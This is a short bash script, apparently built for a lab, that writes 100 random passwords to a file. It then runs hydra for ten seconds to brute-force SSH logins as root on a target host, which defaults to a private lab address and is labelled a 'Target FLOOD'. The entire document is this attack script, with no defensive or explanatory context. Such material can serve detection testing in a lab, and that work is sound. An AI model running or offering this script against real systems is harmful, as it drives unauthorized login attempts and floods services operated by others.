#!/usr/bin/env bash
TARGET_IP="${SERVER_IP:-192.168.56.111}"
echo "[+] Target FLOOD: http://${TARGET_IP}"
TARGET_HOST=$(echo "${TARGET_IP}" | sed 's/http:\/\///' | sed 's/https:\/\///' | cut -d'/' -f1)
PWDS="/tmp/pass.lst"
for i in $( seq 1 100 ); do
	cat /dev/urandom | tr -dc "a-zA-Z0-9" | fold -w 24 | head -n 1 >> "${PWDS}"
done
timeout 10 /usr/bin/hydra -l root -P ${PWDS} ssh://${TARGET_HOST}
